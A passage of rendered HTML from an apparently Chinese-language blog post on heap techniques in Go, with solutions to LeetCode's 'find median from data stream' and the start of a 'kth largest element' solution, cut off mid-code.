class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ListNode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>ListNodeHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> any           <span class=\"token punctuation\">&#123;</span> x <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> x <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"中位数问题\"><a class=\"anchor\" href=\"#中位数问题\">#</a> 中位数问题</h2>\n<p>两个堆，一个大顶堆，一个小顶堆。</p>\n<h3 id=\"2-数据流的中位数\"><a class=\"anchor\" href=\"#2-数据流的中位数\">#</a> 2. 数据流的中位数</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9maW5kLW1lZGlhbi1mcm9tLWRhdGEtc3RyZWFtL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/find-median-from-data-stream/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTRfSGVhcC9sZXZlbF8zL3RvcGljXzEuZ28=\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/14_Heap/level_3/topic_1.go</span></p>\n<blockquote>\n<p><strong>中位数</strong>是有序整数列表中的中间值。如果列表的大小是偶数，则没有中间值，中位数是两个中间值的平均值。</p>\n<ul>\n<li>例如  <code>arr = [2,3,4]</code>  的中位数是  <code>3</code>  。</li>\n<li>例如  <code>arr = [2,3]</code>  的中位数是  <code>(2 + 3) / 2 = 2.5</code>  。</li>\n</ul>\n<p>实现 MedianFinder 类:</p>\n<ul>\n<li><code>MedianFinder() </code> 初始化  <code>MedianFinder</code>  对象。</li>\n<li><code>void addNum(int num)</code>  将数据流中的整数  <code>num</code>  添加到数据结构中。</li>\n<li><code>double findMedian()</code>  返回到目前为止所有元素的中位数。与实际答案相差  <code>10^-5</code>  以内的答案将被接受。</li>\n</ul>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> MedianFinder <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tmaxHeap <span class=\"token operator\">*</span>MaxHeap</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tminHeap <span class=\"token operator\">*</span>MinHeap</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">Constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> MedianFinder <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tmaxHeap<span class=\"token punctuation\">,</span> minHeap <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>MaxHeap<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>MinHeap<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Init</span><span class=\"token punctuation\">(</span>maxHeap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Init</span><span class=\"token punctuation\">(</span>minHeap<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">return</span> MedianFinder<span class=\"token punctuation\">&#123;</span>maxHeap<span class=\"token punctuation\">,</span> minHeap<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>this <span class=\"token operator\">*</span>MedianFinder<span class=\"token punctuation\">)</span> <span class=\"token function\">AddNum</span><span class=\"token punctuation\">(</span>num <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>this<span class=\"token punctuation\">.</span>minHeap<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>this<span class=\"token punctuation\">.</span>maxHeap<span class=\"token punctuation\">,</span> heap<span class=\"token punctuation\">.</span><span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span>this<span class=\"token punctuation\">.</span>minHeap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">for</span> this<span class=\"token punctuation\">.</span>minHeap<span class=\"token punctuation\">.</span><span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> this<span class=\"token punctuation\">.</span>maxHeap<span class=\"token punctuation\">.</span><span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>this<span class=\"token punctuation\">.</span>minHeap<span class=\"token punctuation\">,</span> heap<span class=\"token punctuation\">.</span><span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span>this<span class=\"token punctuation\">.</span>maxHeap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>this <span class=\"token operator\">*</span>MedianFinder<span class=\"token punctuation\">)</span> <span class=\"token function\">FindMedian</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">float64</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">if</span> this<span class=\"token punctuation\">.</span>minHeap<span class=\"token punctuation\">.</span><span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> this<span class=\"token punctuation\">.</span>maxHeap<span class=\"token punctuation\">.</span><span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>this<span class=\"token punctuation\">.</span>minHeap<span class=\"token punctuation\">.</span><span class=\"token function\">Top</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>this<span class=\"token punctuation\">.</span>minHeap<span class=\"token punctuation\">.</span><span class=\"token function\">Top</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>this<span class=\"token punctuation\">.</span>maxHeap<span class=\"token punctuation\">.</span><span class=\"token function\">Top</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"31\"></td><td><pre> * Your MedianFinder object will be instantiated and called as such:</pre></td></tr><tr><td data-num=\"32\"></td><td><pre> * obj := Constructor();</pre></td></tr><tr><td data-num=\"33\"></td><td><pre> * obj.AddNum(num);</pre></td></tr><tr><td data-num=\"34\"></td><td><pre> * param_2 := obj.FindMedian();</pre></td></tr><tr><td data-num=\"35\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">type</span> MinHeap <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span>           <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Less</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>      <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>val any<span class=\"token punctuation\">)</span>       <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> any <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tval <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token keyword\">return</span> val</pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Top</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">type</span> MaxHeap <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MaxHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span>           <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MaxHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Less</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MaxHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>      <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MaxHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>val any<span class=\"token punctuation\">)</span>       <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> val<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MaxHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> any           <span class=\"token punctuation\">&#123;</span> val <span class=\"token operator\">:=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> val <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MaxHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Top</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span>           <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"第k大元素\"><a class=\"anchor\" href=\"#第k大元素\">#</a> 第 k 大元素</h2>\n<p>第 k 大元素，使用小顶堆，保证栈顶元素是最小的元素。<br />\n如果堆的长度超过 k，则弹出栈顶元素，直到长度小于等于 k。<br />\n剩下的栈顶元素就是当前第 K 大的元素。</p>\n<p>反之，第 k 小元素使用大顶堆。</p>\n<h3 id=\"3-第k大元素\"><a class=\"anchor\" href=\"#3-第k大元素\">#</a> 3. 第 k 大元素</h3>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token string\">\"container/heap\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token string\">\"fmt\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">type</span> MinHeap <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Less</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">return</span> h<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> h<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\th<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> h<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> h<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>x <span class=\"token keyword\">interface</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token operator\">*</span>h <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>h <span class=\"token operator\">*</span>MinHeap<span class=\"token punctuation\">)</span> <span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\told <span class=\"token operator\">:=</span> <span class=\"token operator\">*</span>h</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tn <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>old<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tx <span class=\"token operator\">:=</span> old<span class=\"token punctuation\">[</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token operator\">*</span>h <span class=\"token operator\">=</span> old<span class=\"token punctuation\">[</span><span class=\"token number\">0</span> <span class=\"token punctuation\">:</span> n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">findKthLargest</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> k <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> k <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token comment\">// 初始化最小堆</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\th <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>MinHeap<span class=\"token punctuation\">&#123;</span><span class=\"token 